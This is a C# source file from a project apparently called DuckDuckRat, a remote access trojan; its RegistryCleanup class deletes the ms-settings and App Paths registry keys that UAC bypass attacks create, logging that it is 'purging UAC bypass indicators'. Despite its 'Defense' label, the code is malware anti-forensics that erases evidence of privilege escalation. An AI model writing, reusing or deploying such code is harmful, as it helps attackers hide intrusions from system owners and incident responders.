using System;
using Microsoft.Win32;
using DuckDuckRat.Defense;

namespace DuckDuckRat.Defense
{
    public static class RegistryCleanup
    {
        private static void Log(string msg) => SafetyManager.Log(msg);

        public static void SanitizeUacTraces()
        {
            try
            {
                Log("[SANITY] Purging UAC bypass indicators...");
                
                // 1. HKCU\Software\Classes\ms-settings (The most noisy vector)
                string msSettingsPath = @"Software\Classes\ms-settings";
                if (Registry.CurrentUser.OpenSubKey(msSettingsPath) != null)
                {
                    Log("Found ms-settings artifact. Deleting tree...");
                    Registry.CurrentUser.DeleteSubKeyTree(msSettingsPath, false);
                }

                // 2. HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe (AppPaths)
                string appPathsControl = @"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe";
                if (Registry.CurrentUser.OpenSubKey(appPathsControl) != null)
                {
                    Registry.CurrentUser.DeleteSubKeyTree(appPathsControl, false);
                }

                // 3. Generic AppPaths for ComputerDefaults (if any)
                string appPathsCD = @"Software\Microsoft\Windows\CurrentVersion\App Paths\ComputerDefaults.exe";
                if (Registry.CurrentUser.OpenSubKey(appPathsCD) != null)
                {
                    Registry.CurrentUser.DeleteSubKeyTree(appPathsCD, false);
                }

                Log("[SANITY] All registry indicators purged.");
            }
            catch (Exception ex)
            {
                Log($"[SANITY] Error during cleanup: {ex.Message}");
            }
        }
    }
}
